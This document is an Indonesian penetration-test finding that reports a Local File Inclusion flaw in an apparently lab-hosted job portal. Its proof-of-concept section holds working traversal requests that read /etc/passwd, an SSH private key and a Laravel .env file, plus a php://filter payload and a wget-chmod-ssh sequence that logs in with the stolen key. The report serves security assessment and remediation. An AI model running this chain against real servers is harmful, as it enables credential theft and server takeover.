# Finding 05: Local File Inclusion (LFI)

| Item | Detail |
|------|--------|
| **Kerentanan** | Local File Inclusion (LFI) — Manipulasi Parameter Path File |
| **Severity** | High |
| **Skor CVSS** | 7.5 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`) |
| **URL PoC** | `http://jobportal.vulnapp.id/api/download?file=../../../../etc/passwd` |
| **Endpoint** | `GET /api/download?file=...` / `GET /page.php?file=...` |

---

## Deskripsi

Kerentanan ini terjadi karena aplikasi menerima jalur file (*file path*) dari input pengguna tanpa sanitasi atau validasi yang ketat di sisi server. Hal ini memungkinkan penyerang memanipulasi parameter lokasi file (misalnya menggunakan teknik *directory traversal* seperti `../`) untuk membaca file lokal yang ada di dalam server web.

---

## Dampak

- Penyerang dapat melakukan pencurian data dan berkas sensitif (Sensitive Data Exposure) dengan membaca file konfigurasi sistem, file sumber kode aplikasi, kredensial database, hingga berkas sensitif server seperti `/etc/passwd` di Linux atau berkas konfigurasi Laravel (`config/app.php`, `database.php`, `.env`).
- Celah ini berpotensi mengalami eskalasi ke Remote Code Execution (RCE) jika penyerang menyuntikkan kode berbahaya ke file log atau session (*log poisoning*).
- Eksploitasi lanjutan dari celah LFI dapat berujung pada pengambilalihan server secara penuh (Full System Compromise).
- Private key SSH milik user (`~/.ssh/id_rsa`) yang dapat dibaca via LFI bisa diunduh penyerang (misalnya dengan `wget`) dan langsung digunakan untuk login SSH ke server tanpa memerlukan password.

---

## Rekomendasi Perbaikan

- Gunakan whitelist file yang diizinkan untuk membatasi input pengguna hanya pada daftar nama file yang sudah ditentukan secara pasti (*allowlist*).
- Hindari memasukkan file berdasarkan input pengguna secara langsung dengan menggunakan pemeta (*mapping*) seperti angka ID.
- Lakukan sanitasi jalur file untuk menghapus karakter berbahaya seperti `../` menggunakan fungsi penyaring bawaan (seperti `basename()` atau `realpath()`).
- Terapkan prinsip Least Privilege pada server web agar akun pengelola aplikasi tidak memiliki akses membaca ke file sistem di luar web root.
- Lindungi private key SSH dengan permission `600` dan kepemilikan user (bukan akun web server `www-data`), serta pastikan traversal dari web root tidak dapat menjangkau direktori home user.

---

## Langkah Proof of Concept (PoC)

### Langkah 1 — Identifikasi parameter lokasi file pada request HTTP

Menemukan endpoint aplikasi yang menerima masukan nama file/path melalui URL.

**Request:**

```http
GET /api/download?file=statement.pdf HTTP/1.1
Host: jobportal.vulnapp.id
```

> **Capture 1:** Request awal pada endpoint parameter `file`

---

### Langkah 2 — Memanipulasi parameter menggunakan teknik Directory Traversal (`../../../../etc/passwd`)

Mengganti nama file dengan sekuens traversal `../` untuk melompati direktori web root ke direktori sistem operasi.

**Request:**

```http
GET /api/download?file=../../../../etc/passwd HTTP/1.1
Host: jobportal.vulnapp.id
```

**Response (Sensitif Content Leaked):**

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
semot:x:1000:1000:semot:/home/semot:/bin/bash
```

> **Capture 2:** Pembacaan isi berkas sensitif `/etc/passwd` via Directory Traversal

---

### Langkah 3 — Membaca private key SSH user login (`../../../../home/<namauserlogin>/.ssh/id_rsa`)

Setelah mendapatkan isi `/etc/passwd`, penyerang mengidentifikasi user yang memiliki shell login (`/bin/bash`) — pada contoh Langkah 2 ditemukan user `semot`. Private key SSH milik user tersebut tersimpan di `/home/semot/.ssh/id_rsa` dan ternyata juga dapat dibaca melalui LFI.

**Request:**

```http
GET /api/download?file=../../../../home/semot/.ssh/id_rsa HTTP/1.1
Host: jobportal.vulnapp.id
```

**Response (SSH Private Key Leaked):**

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAShW9yP7Z... (potongan isi private key)
-----END OPENSSH PRIVATE KEY-----
```

> **Capture 3:** Pembacaan private key SSH `/home/semot/.ssh/id_rsa` milik user login via LFI

**Eksploitasi lanjutan — Mengunduh private key menggunakan `wget` dari mesin penyerang:**

```bash
# 1. Unduh private key melalui URL LFI
#    (berikan tanda kutip agar karakter ? dan & tidak diinterpretasi shell)
wget "http://jobportal.vulnapp.id/api/download?file=../../../../home/semot/.ssh/id_rsa"

# 2. wget menyimpan berkas dengan nama bawaan URL lengkap dengan query string-nya
#    (download?file=...) — rename menjadi id_rsa agar dapat digunakan
mv 'download?file=../../../../home/semot/.ssh/id_rsa' id_rsa

# 3. WAJIB chmod 600 terlebih dahulu sebelum digunakan — tanpa langkah ini SSH
#    menolak private key dengan error "WARNING: UNPROTECTED PRIVATE KEY FILE!"
chmod 600 id_rsa

# 4. Login ke server target menggunakan private key hasil unduhan — tanpa password
ssh -i id_rsa semot@jobportal.vulnapp.id
```

**Jika koneksi SSH terhenti dengan warning `REMOTE HOST IDENTIFICATION HAS CHANGED!`** — fingerprint host target yang tersimpan di berkas `known_hosts` mesin penyerang tidak lagi cocok (fingerprint server berubah, misalnya VM target di-*rebuild*), sehingga SSH menolak koneksi (*Host key verification failed*). Hapus entri host lama tersebut dengan `ssh-keygen -R`, kemudian ulangi perintah login SSH di atas:

```bash
# Hapus entri lama target dari known_hosts mesin penyerang
# (/home/senerex/.ssh/known_hosts = berkas known_hosts di mesin penyerang,
#  192.168.56.108 = IP server target yang dituju)
ssh-keygen -f '/home/senerex/.ssh/known_hosts' -R '192.168.56.108'
```

```text
semot@jobportal:~$ whoami
semot
```

> **Capture 4:** Login SSH berhasil menggunakan private key hasil unduhan `wget` (setelah rename & `chmod 600`) — diperoleh shell interaktif tanpa memerlukan password

### Langkah 4 — Membaca file lingkungan dan konfigurasi sensitif Laravel (`.env` & `config/database.php`)

Menggunakan LFI dengan sekuens traversal `../../.env` untuk membaca file environment Laravel yang menyimpan rahasia aplikasi (*App Key* & *Database Credentials*), atau `config/database.php` via PHP filter wrapper.

**Request 1 — Accessing `.env` directly via LFI:**

```http
GET /api/download?file=../../.env HTTP/1.1
Host: jobportal.vulnapp.id
```

**Response 1 (Environment Variables Leaked):**

```env
APP_NAME=JobPortal
APP_ENV=production
APP_KEY=base64:XyZ9Qk8rW... (APP_KEY)
APP_DEBUG=false

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=jobportal_db
DB_USERNAME=jobportal_user
DB_PASSWORD=S5cur3P@ssw0rd!
```

---

**Request 2 — Reading Laravel Config file (`config/database.php`) via PHP Filter:**

```http
GET /api/download?file=php://filter/read=convert.base64-encode/resource=../../config/database.php HTTP/1.1
Host: jobportal.vulnapp.id
```

**Response 2 (Base64 Source Code):**

```text
PD9waHAKcmV0dXJuIFsgJ2RlZmF1bHQnID0+IGVudignREJfQ09OTkVDVElPTicsICdteXNxbCcpLCA...
```

> **Capture 5:** Ekstraksi berkas konfigurasi sensitif `.env` & `config/database.php`
